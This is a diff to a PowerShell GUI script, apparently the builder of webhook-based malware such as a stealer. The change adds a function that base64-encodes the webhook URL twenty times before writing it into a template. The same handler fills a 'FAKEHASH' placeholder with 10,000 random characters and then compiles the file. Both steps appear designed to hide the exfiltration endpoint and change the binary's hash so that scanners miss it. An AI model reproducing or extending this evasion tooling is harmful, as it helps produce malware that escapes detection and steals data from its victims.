@@ -1,4 +1,30 @@
 # Lấy UUID của hệ thống
+
+function Encode-Base64 {
+    param (
+        [string]$inputString
+    )
+
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($inputString)
+    $base64String = [System.Convert]::ToBase64String($bytes)
+    return $base64String
+}
+
+function Encode-Base64TwentyTimes {
+    param (
+        [string]$inputString
+    )
+
+    Write-Output "Encoding 20 times."
+
+    $encodedString = $inputString
+    for ($i = 0; $i -lt 20; $i++) {
+        $encodedString = Encode-Base64 -inputString $encodedString
+    }
+
+    return $encodedString
+}
+
 function Get-RandomString {
     param (
         [int]$length = 100
@@ -67,8 +93,9 @@ $button.Add_Click({
         # Read the file content and replace placeholder
         $content = Get-Content $filePath -Raw
         $randomString = Get-RandomString -length 10000
+        $webhookencode = Encode-Base64TwentyTimes -inputString $webhook
         $content = $content -replace 'FAKEHASH', $randomString
-        $content = $content -replace 'YOUR_WEBHOOK_HERE2', $webhook
+        $content = $content -replace 'YOUR_WEBHOOK_HERE2', $webhookencode
         Set-Content -Path $filePath -Value $content
 
         # Path to the complie.exe executable
